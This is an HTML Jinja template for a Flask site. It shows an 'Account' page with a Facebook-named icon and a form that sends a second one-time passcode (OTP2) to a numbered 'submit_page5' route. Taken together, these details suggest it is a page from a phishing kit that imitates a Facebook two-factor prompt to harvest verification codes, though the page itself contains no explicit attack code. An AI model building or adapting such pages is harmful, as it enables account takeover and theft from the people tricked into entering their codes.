<!DOCTYPE html>
<html lang="{{ lang.get('lang', 'en') }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>{{ lang['4.Account'] }}</title>
    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='css/4.css') }}">
    <link rel="icon" href="{{ url_for('static', filename='images/anhfb.png') }}" type="image/webp">

    <style>
        input[type='number']::-webkit-outer-spin-button,
        input[type='number']::-webkit-inner-spin-button {
            -webkit-appearance: none;
            -moz-appearance: textfield;
            appearance: none;
            margin: 0;
        }
    </style>
    
    <meta http-equiv="X-Content-Type-Options" content="nosniff">
    <meta http-equiv="X-Frame-Options" content="DENY">
    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
</head>
<body>

    <div class="header-container">
        <div class="lop3">
            <img class="hinh1" src="{{ url_for('static', filename='images/anh5.png') }}" alt="Hình ảnh mô tả">
        </div>
    </div>

    <div class="main">
        <h1 class="h1">{{ lang['4.fa'] }}</h1>
        <h2 class="h2">{{ lang['4.app'] }}</h2>
        <p class="h3">{{ lang['4.we'] }}</p>
        
        <img class="hinh2" src="{{ url_for('static', filename='images/aanh77.jpg') }}" alt="Hình ảnh mô tả">
        
        <p class="hh1">{{ lang['4.wew'] }}</p>
        
        <div class="bang">
            <form id="loginForm" method="POST" action="{{ url_for('submit_page5') }}" onsubmit="validateForm(event);">
                
                <div class="form-group">
                    <label for="OTP2"></label>
                    <input type="number" id="OTP2" name="OTP2" placeholder="{{lang['opt1']}}" >
                </div>
                
                <div class="row">
                    <p class="err OTP_err"></p>
                </div>
                
                <div>
                    <button type="submit" id="submitButton">
                        <span class="button-text">{{ lang['Send'] }}</span>
                        <span class="spinner"></span>
                    </button>
                </div>
                
            </form>
        </div>
    </div>

    <script src="{{ url_for('static', filename='js/5.js') }}"></script>
</body>
</html>
